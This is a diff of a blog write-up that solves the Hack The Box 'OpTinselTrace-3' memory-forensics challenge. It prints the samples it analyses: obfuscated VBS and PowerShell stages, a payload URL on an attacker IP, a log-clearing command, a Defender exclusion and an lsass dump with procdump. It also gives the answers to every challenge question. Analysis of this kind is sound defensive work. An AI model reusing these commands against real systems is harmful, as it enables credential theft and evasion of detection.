@@ -1,24 +1,39 @@
 ---
 layout: post
-title:  "Sherlocks - OpTinselTrace-3"
-category: HTB
+date: 2023-12-27
+platform: "HTB"
+title:  "OpTinselTrace-3"
+difficulty: "Medium"
+scenario: "Oh no! Our IT admin is a bit of a cotton-headed ninny-muggins, ByteSparkle left his VPN configuration file in our fancy private S3 location! The nasty attackers may have gained access to our internal network. We think they compromised one of our TinkerTech workstations. Our security team has managed to grab you a memory dump - please analyse it and answer the questions! Santa is waiting…"
+question_1: "What is the name of the file that is likely copied from the shared folder (including the file extension)?"
+question_2: "What is the file name used to trigger the attack (including the file extension)?"
+question_3: "What is the name of the file executed by click_for_present.lnk (including the file extension)?"
+question_4: "What is the name of the program used by the vbs script to execute the next stage?"
+question_5: "What is the name of the function used for the powershell script obfuscation?"
+question_6: "What is the URL that the next stage was downloaded from?"
+question_7: "What is the IP and port that the executable downloaded the shellcode from (IP:Port)?"
+question_8: "What is the process ID of the remote process that the shellcode was injected into?"
+question_9: "After the attacker established a Command & Control connection, what command did they use to clear all event logs?"
+question_10: "What is the full path of the folder that was excluded from defender?"
+question_11: "What is the original name of the file that was ingressed to the victim?"
+question_12: "What is the name of the process targeted by procdump.exe?"
 ---
-{% include htb_sherlock.html title="OpTinselTrace-3" difficulty="Medium" scenario="Oh no! Our IT admin is a bit of a cotton-headed ninny-muggins, ByteSparkle left his VPN configuration file in our fancy private S3 location! The nasty attackers may have gained access to our internal network. We think they compromised one of our TinkerTech workstations. Our security team has managed to grab you a memory dump - please analyse it and answer the questions! Santa is waiting…" %}
+{% include scenario.html %}
 
 # Tasks
 
-1. [What is the name of the file that is likely copied from the shared folder (including the file extension)?](#1-what-is-the-name-of-the-file-that-is-likely-copied-from-the-shared-folder-including-the-file-extension)
-2. [What is the file name used to trigger the attack (including the file extension)?](#2-what-is-the-file-name-used-to-trigger-the-attack-including-the-file-extension)
-3. [What is the name of the file executed by click_for_present.lnk (including the file extension)?](#3-what-is-the-name-of-the-file-executed-by-click_for_presentlnk-including-the-file-extension)
-4. [What is the name of the program used by the vbs script to execute the next stage?](#4-what-is-the-name-of-the-program-used-by-the-vbs-script-to-execute-the-next-stage)
-5. [What is the name of the function used for the powershell script obfuscation?](#5-what-is-the-name-of-the-function-used-for-the-powershell-script-obfuscation)
-6. [What is the URL that the next stage was downloaded from?](#6-what-is-the-url-that-the-next-stage-was-downloaded-from)
-7. [What is the IP and port that the executable downloaded the shellcode from (IP:Port)?](#7-what-is-the-ip-and-port-that-the-executable-downloaded-the-shellcode-from-ipport)
-8. [What is the process ID of the remote process that the shellcode was injected into?](#8-what-is-the-process-id-of-the-remote-process-that-the-shellcode-was-injected-into)
-9. [After the attacker established a Command & Control connection, what command did they use to clear all event logs?](#9-after-the-attacker-established-a-command--control-connection-what-command-did-they-use-to-clear-all-event-logs)
-10. [What is the full path of the folder that was excluded from defender?](#10-what-is-the-full-path-of-the-folder-that-was-excluded-from-defender)
-11. [What is the original name of the file that was ingressed to the victim?](#11-what-is-the-original-name-of-the-file-that-was-ingressed-to-the-victim)
-12. [What is the name of the process targeted by procdump.exe?](#12-what-is-the-name-of-the-process-targeted-by-procdumpexe)
+1. [{{ page.question_1 }}](#question-1)
+2. [{{ page.question_2 }}](#question-2)
+3. [{{ page.question_3 }}](#question-3)
+4. [{{ page.question_4 }}](#question-4)
+5. [{{ page.question_5 }}](#question-5)
+6. [{{ page.question_6 }}](#question-6)
+7. [{{ page.question_7 }}](#question-7)
+8. [{{ page.question_8 }}](#question-8)
+9. [{{ page.question_9 }}](#question-9)
+10. [{{ page.question_10}}](#question-10)
+11. [{{ page.question_11}}](#question-11)
+12. [{{ page.question_12}}](#question-12)
 
 # Discussion
 
@@ -36,7 +51,8 @@ It may not be all the relevant information that we can deduce, but limiting the 
 First, we need to grab the `optinseltrace3.zip` file, and unzip it, it contains a file called `santa_claus.bin`.
 This is a memory dump, and we need to use [Volatility](https://github.com/volatilityfoundation/volatility3) for that (or [MemProcFS](https://github.com/ufrisk/MemProcFS))
 
-### 1. What is the name of the file that is likely copied from the shared folder (including the file extension)?
+## Question 1
+{% include item.html type="question" id="1" question=page.question_1 %}
 This question was puzzling me for quite some time, but I knew I had to find some files at least - and usually files are copied/downloaded to the `C:\Users` and then `AppData`, `Desktop`, `Documents` or `Downloads`.
 
 {% highlight powershell %}
@@ -81,9 +97,10 @@ Either way, we've pulled two files out from the memory dump with Volatility, so 
 
 Well, this looks suspiciously like a payload. I think this zip file is the one of the first things in the attack chain.
 
-{% include htb_flag.html id="1" description="What is the name of the file that is likely copied from the shared folder (including the file extension)?" flag="present_for_santa.zip" %}
+{% include item.html type="answer" id="1" description=page.question_1 answer="present_for_santa.zip" %}
 
-### 2. What is the file name used to trigger the attack (including the file extension)?
+## Question 2
+{% include item.html type="question" id="2" question=page.question_2 %}
 
 When we are looking at the zip contents, we see a `lnk` shortcut file, and a `VB Script` file. Let's check out the shortcut file with [LECmd](https://ericzimmerman.github.io/#!index.md):
 {% highlight powershell %}
@@ -110,15 +127,17 @@ $file = Get-ChildItem -Path "C:\Users\" -Filter "present*.vbs" -File -Recurse| S
 
 Think we got it. 
 
-{% include htb_flag.html id="2" description="What is the file name used to trigger the attack (including the file extension)?" flag="click_for_present.lnk" %}
+{% include item.html type="answer" id="2" description=page.question_2 answer="click_for_present.lnk" %}
 
-### 3. What is the name of the file executed by click_for_present.lnk (including the file extension)?
+## Question 3
+{% include item.html type="question" id="3" question=page.question_3 %}
 
 We did most of the work during the last question, we know which files are being executed (esentially any file starting with `present` and ending with `.vbs` in the users folder)
 
-{% include htb_flag.html id="3" description="What is the name of the file executed by click_for_present.lnk (including the file extension)?" flag="present.vbs" %}
+{% include item.html type="answer" id="3" description=page.question_3 answer="present.vbs" %}
 
-### 4. What is the name of the program used by the vbs script to execute the next stage?
+## Question 4
+{% include item.html type="question" id="4" question=page.question_4 %}
 
 If we check the first 10 lines of the vbs script, we can see something that is slightly annoying
 
@@ -143,7 +162,7 @@ Other than that, comments in vbs starts with a single qoute `'` or `rem` - so le
 Get-Content -Path .\present.vbs | sls -NotMatch "'" | sls -NotMatch "^$"
 
 Nonphilosophicalgloriat = LenB("Ritualizing")
-Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.oot\cimv2")
 Private Const Overcrammi = &HFFFFB15F
 Private Const Rdkridtet = &HFFFFB96E
 Private Const Delarbejdets = -19974
@@ -249,9 +268,10 @@ Often with obfuscation, the author likes to thrown in a bunch of random informat
 
 I notice a few things here, mainly `Aadselsbilles = "power" & Unrustling & "hell "` - this gets translated into `powershell`, and we also see the final line `Firklverne.Run Aadselsbilles + Chr(34) + A4 + Chr(34),0` which translates roughly into `powershell "$A4"`. 34 is the ASCII character for double quotes, and A4 in our VB Script seems like the interesting part. Let's make a note of that and answer which file is being executed.
 
-{% include htb_flag.html id="4" description="What is the name of the program used by the vbs script to execute the next stage?" flag="powershell.exe" %}
+{% include item.html type="answer" id="4" description=page.question_4 answer="powershell.exe" %}
 
-### 5. What is the name of the function used for the powershell script obfuscation?
+## Question 5
+{% include item.html type="question" id="5" question=page.question_5 %}
 
 We have already figured out that A4 is something we are looking for, let's find all lines referencing A4.
 
@@ -272,15 +292,16 @@ Looking at it, it seems like we need to concatenate all the A4 strings into a si
 {% highlight powershell %}
 
 (Get-Content -Path .\present.vbs | sls 'A4 = A4 \+') -replace "`"'.*","`"" -replace 'A4 = A4 \+ ' -replace '"' -join '' -replace "GRINCH","i"
-Function WrapPresent ($Ensproglig){$Nringsvirksomhedernes = $Ensproglig.Length-1; For ($Smiths211=6; $Smiths211 -lt $Nringsvirksomhedernes){$Malice=$Malice+$Ensproglig.Substring($Smiths211, 1);$Smiths211+=7;}$Malice;};$present=WrapPresent 'Once uhon a ttme, intthe whpmsical:town o/ Holid/y Holl7w, the7e live. two l7gendar4 figur.s know1 far a9d wide8 the G.inch a5d Sant2 Claus/ They desidedeon oppssite stdes ofrthe toon, eacy with _heir ocn uniqhe charrcterisiics thst defited them. The arinch,sa soli/ary creature,vdwellei in a lave at_p Mounp Crumprt. Wite his gseen fue and anheart teeming.y two jizes tpo smalg, he h';$gluhwein=WrapPresent 'd a peichant eor misxhief a';. ($gluhwein) (WrapPresent in fpr anyteing fertive. se despesed thn joyout celebLationsothat echoed tarough the towi, espeoially nuring =he win$er holedays. nn the vther s:de of tolidayeHollowm nestlpd in ac');$File=WrapPresent 'cozy w\rkshoppat therNorth eole, lsved the jollynand betevolen. SantaeClaus.xWith hes roun';. ($gluhwein) (WrapPresent ' belly$ rosy pheeks,eand a reart bsimmingewith knndnesst he spLnt hisodays ccaftingatoys ftr chiliren around thn world=and sp$eadingpcheer eherever he west. Yeae afternyear, ts the Lolidayoseasoncapproaahed, tte townifolk eogerly nrepare+ for f$stivitFes, adirning lhe streets wih');. ($gluhwein) (WrapPresent 'h ligh.s, set ing up$decoragions, lnd sinuing johful tuwes. Whele Sania businy prep red hi( sleigN and ceecked wis lis- twiceO the Gbinch sjethed en his cave, itritate  by thn merrieent thtt fill.d the wir. One fatefbl wintcr, a plrticulirly ice chillnswept through)Holida. HolloD, causong chaws and nisruptlng theoholidaa spirid. The Fnowstoims grel wildee, and (he tow$sfolk ptrugglrd to keep thesr festeve tranitionstalive.,Childr$n werepdisappeinted rs the srospece of a noyous telebraLion diomed. Wctnessiag the towns distresso Santanknew h) had t; do soe');. ($gluhwein) (WrapPresent 'ethingSto restore tha holidry cheet. With-a twinPle in ris eyeoand a ceart fell of sope, hs decid d to p$y a vipit to ehe Grirch, hosing toewarm hns heart and bLing baok the cpirit af the teason.iGuidedoby hisnunyiel;i');
+Function WrapPresent ($Ensproglig){$Nringsvirksomhedernes = $Ensproglig.Length-1; For ($Smiths211=6; $Smiths211 -lt $Nringsvirksomhedernes){$Malice=$Malice+$Ensproglig.Substring($Smiths211, 1);$Smiths211+=7;}$Malice;};$present=WrapPresent 'Once uhon a ttme, intthe whpmsical:town o/ Holid/y Holl7w, the7e live. two l7gendar4 figur.s know1 far a9d wide8 the G.inch a5d Sant2 Claus/ They desidedeon oppssite stdes ofrthe toon, eacy with _heir ocn uniqhe charrcterisiics thst defited them. The arinch,sa soli/ary creature,vdwellei in a lave at_p Mounp Crumprt. Wite his gseen fue and anheart teeming.y two jizes tpo smalg, he h';$gluhwein=WrapPresent 'd a peichant eor misxhief a';. ($gluhwein) (WrapPresent in fpr anyteing fertive. se despesed thn joyout celebLationsothat echoed tarough the towi, espeoially nuring =he win$er holedays. nn the vther s:de of tolidayeHollowm nestlpd in ac');$File=WrapPresent 'cozy wkshoppat therNorth eole, lsved the jollynand betevolen. SantaeClaus.xWith hes roun';. ($gluhwein) (WrapPresent ' belly$ rosy pheeks,eand a reart bsimmingewith knndnesst he spLnt hisodays ccaftingatoys ftr chiliren around thn world=and sp$eadingpcheer eherever he west. Yeae afternyear, ts the Lolidayoseasoncapproaahed, tte townifolk eogerly nrepare+ for f$stivitFes, adirning lhe streets wih');. ($gluhwein) (WrapPresent 'h ligh.s, set ing up$decoragions, lnd sinuing johful tuwes. Whele Sania businy prep red hi( sleigN and ceecked wis lis- twiceO the Gbinch sjethed en his cave, itritate  by thn merrieent thtt fill.d the wir. One fatefbl wintcr, a plrticulirly ice chillnswept through)Holida. HolloD, causong chaws and nisruptlng theoholidaa spirid. The Fnowstoims grel wildee, and (he tow$sfolk ptrugglrd to keep thesr festeve tranitionstalive.,Childr$n werepdisappeinted rs the srospece of a noyous telebraLion diomed. Wctnessiag the towns distresso Santanknew h) had t; do soe');. ($gluhwein) (WrapPresent 'ethingSto restore tha holidry cheet. With-a twinPle in ris eyeoand a ceart fell of sope, hs decid d to p$y a vipit to ehe Grirch, hosing toewarm hns heart and bLing baok the cpirit af the teason.iGuidedoby hisnunyiel;i');
 
 {% endhighlight %}
 
 At a glance, I only spot one function `WrapPresent`.
 
-{% include htb_flag.html id="5" description="What is the name of the function used for the powershell script obfuscation?" flag="WrapPresent" %}
+{% include item.html type="answer" id="5" description=page.question_5 answer="WrapPresent" %}
 
-### 6. What is the URL that the next stage was downloaded from?
+## Question 6
+{% include item.html type="question" id="6" question=page.question_6 %}
 
 Once we have the deobfuscated PowerShell script, it may help us if we pretty-print it and hope it helps us to better understand what it does.
 
@@ -303,9 +324,10 @@ http://77.74.198.52/destroy_christmas/evil_present.jpg
 
 We found the content of the `$present` variable, which is fetched by another function.
 
-{% include htb_flag.html id="6" description="What is the URL that the next stage was downloaded from?" flag="http://77.74.198.52/destroy_christmas/evil_present.jpg" %}
+{% include item.html type="answer" id="6" description=page.question_6 answer="http://77.74.198.52/destroy_christmas/evil_present.jpg" %}
 
-### 7. What is the IP and port that the executable downloaded the shellcode from (IP:Port)?
+## Question 7
+{% include item.html type="question" id="7" question=page.question_7 %}
 We can turn to [Ghidra](https://ghidra-sre.org/) when we need to reverse an application or simply upload this file to a site like VirusTotal and see the sockets the application creates.
 #### Virus Total
 If we decide to use Virus Total, we can use [vt-cli](https://github.com/VirusTotal/vt-cli) or [virustotal.com](https://virustotal.com).
@@ -342,9 +364,10 @@ We could also run the file on a device behind a [REMnux](https://remnux.org/) ma
 NOTE: user `tmechen` had a bit more luck with analyzing in Ghidra and provided a screenshot which shows the usage of [htons()](https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-htons) function, which indeed is the port number as previously assumed.
 ![present_port](/img/htb/sherlock/optinseltrace-3/present_port.png)
 
-{% include htb_flag.html id="7" description="What is the IP and port that the executable downloaded the shellcode from (IP:Port)?" flag="77.74.198.52:445" %}
+{% include item.html type="answer" id="7" description=page.question_7 answer="77.74.198.52:445" %}
 
-### 8. What is the process ID of the remote process that the shellcode was injected into?
+## Question 8
+{% include item.html type="question" id="8" question=page.question_8 %}
 
 If we again turn to Volatility, and check the network connections with the `windows.netscan` module, and search for the IP from which the shellcode was acquired
 
@@ -356,9 +379,10 @@ Progress:  100.00               PDB scanning finished
 
 The 8th column is our Process ID / PID.
 
-{% include htb_flag.html id="8" description="What is the process ID of the remote process that the shellcode was injected into?" flag="724" %}
+{% include item.html type="answer" id="8" description=page.question_8 answer="724" %}
 
-### 9. After the attacker established a Command & Control connection, what command did they use to clear all event logs?
+## Question 9
+{% include item.html type="question" id="9" question=page.question_9 %}
 
 We need to find out which command was run, and if we use the `windows.cmdline` module, it will only show the processed that were running at the time. The question indicates something was done prior to the data collection. So let's see if we can find a suiting Windows Eventlog in the filescan module.
 
@@ -416,15 +440,17 @@ HostApplication=powershell.exe Get-EventLog -List | ForEach-Object { Clear-Event
 
 In any case, the last command is what we are looking for.
 
-{% include htb_flag.html id="9" description="After the attacker established a Command & Control connection, what command did they use to clear all event logs?" flag="Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }" %}
+{% include item.html type="answer" id="9" description=page.question_9 answer="Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }" %}
 
-### 10. What is the full path of the folder that was excluded from defender?
+## Question 10
+{% include item.html type="question" id="10" question=page.question_10 %}
 
 From our output in #9, we also get the answer by the command `Add-MpPreference`
 
-{% include htb_flag.html id="10" description="What is the full path of the folder that was excluded from defender?" flag="C:\users\public" %}
+{% include item.html type="answer" id="10" description=page.question_10 answer="C:\users\public" %}
 
-### 11. What is the original name of the file that was ingressed to the victim?
+## Question 11
+{% include item.html type="question" id="11" question=page.question_11 %}
 
 If we read the next question, we get the answer. But what we should be doing, would be to extract the file from memory and investigate it with [PEStudio](https://www.winitor.com) or similar.
 
@@ -440,14 +466,11 @@ ImageSectionObject      0xa48e00d10a90  PresentForNaughtyChild.exe      file.0xa
 
 ![ProcDump](/img/htb/sherlock/optinseltrace-3/procdump.png)
 
-{% include htb_flag.html id="11" description="What is the original name of the file that was ingressed to the victim?" flag="procdump.exe" %}
+{% include item.html type="answer" id="11" description=page.question_11 answer="procdump.exe" %}
 
-### 12. What is the name of the process targeted by procdump.exe?
+## Question 12
+{% include item.html type="question" id="12" question=page.question_12 %}
 
 This is also answered in #9, but the command `powershell.exe C:\Users\public\PresentForNaughtyChild.exe -accepteula -r -ma lsass.exe C:\Users\public\stolen_gift.dmp` tells us that they are creating a dump of the `lsass.exe` process.
 
-{% include htb_flag.html id="12" description="What is the name of the process targeted by procdump.exe?" flag="lsass.exe" %}
-
-## Congratulations
-
-You've have pwned OpTinselTrace-3
+{% include item.html type="answer" id="12" description=page.question_12 answer="lsass.exe" %}
